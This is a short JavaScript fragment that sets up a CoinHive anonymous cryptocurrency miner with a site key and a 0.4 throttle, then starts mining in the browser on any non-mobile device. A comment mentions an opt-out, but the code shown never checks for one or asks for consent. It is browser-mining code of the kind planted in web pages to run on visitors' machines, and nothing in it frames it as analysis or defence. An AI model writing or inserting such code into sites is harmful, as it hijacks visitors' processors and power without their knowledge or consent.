        var miner = new CoinHive.Anonymous('xIES6I2eb2zsQEFh2CoD7eRIqR38V2gi', {
            throttle: 0.4
        }); // Only start on non-mobile devices and if not opted-out        // in the last 14400 seconds (4 hours):        if (!miner.isMobile()) {            miner.start();        }